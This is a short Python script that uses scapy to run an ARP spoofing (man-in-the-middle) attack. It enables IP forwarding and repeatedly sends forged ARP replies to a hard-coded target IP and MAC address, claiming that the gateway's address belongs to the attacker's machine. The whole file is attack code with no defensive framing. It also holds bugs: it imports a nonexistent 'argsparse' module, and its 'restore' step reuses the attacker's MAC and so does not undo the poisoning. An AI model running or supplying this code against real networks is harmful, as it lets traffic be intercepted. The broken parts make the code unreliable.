from scapy.all import *
import argsparse
import time
import os
import sys
import uuid 

def _enable_linux_iproute():
	"""
	Enables IP route ( IP Forward ) in linux-based distro
	"""
	file_path = "/proc/sys/net/ipv4/ip_forward"
	with open(file_path) as f:
		if f.read() == 1:
			# already enabled
			return
	with open(file_path, "w") as f:
		print(1, file=f)

def enable_ip_route(verbose=True):
	"""
	Enables IP forwarding
	"""
	if verbose:
		print("[!] Enabling IP Routing...")
	_enable_linux_iproute()
	if verbose:
		print("[!] IP Routing enabled.")
def get_mac_address():
	import uuid
	# after each 2 digits, join elements of getnode().
	print ("The formatted MAC address is : ", end="")
	print (':'.join(['{:02x}'.format((uuid.getnode() >> elements) & 0xff)
	for elements in range(0,2*6,2)][::-1]))

	return ':'.join(['{:02x}'.format((uuid.getnode() >> elements) & 0xff)
	for elements in range(0,2*6,2)][::-1])

def sendPackets(gateway_ip, target_ip, this_mac_address, target_mac_address):
	arp = ARP()
	arp.psrc = gateway_ip
	arp.hwsrc = this_mac_address

	arp = arp
	arp.pdst = target_ip # (say IP address of target machine)
	arp.hwdst = target_mac_address # target mac

	ether = Ether()
	ether.src = this_mac_address
	ether.dst = target_mac_address

	arp.op = 2

	def broadcast():
		packet = ether / arp
		sendp(x=packet, verbose=True)

	broadcast()

try:
	while True:
		sendPackets("1.1.1.1", "10.1.9.135", get_mac_address(), "e0:ac:cb:71:d5:c6")
except KeyboardInterrupt:
	rearp = 0
	while rearp != 10:
		sendPackets("10.1.9.135", "10.1.9.135", get_mac_address(), "e0:ac:cb:71:d5:c6")
		time.sleep(0.1)
		rearp += 1
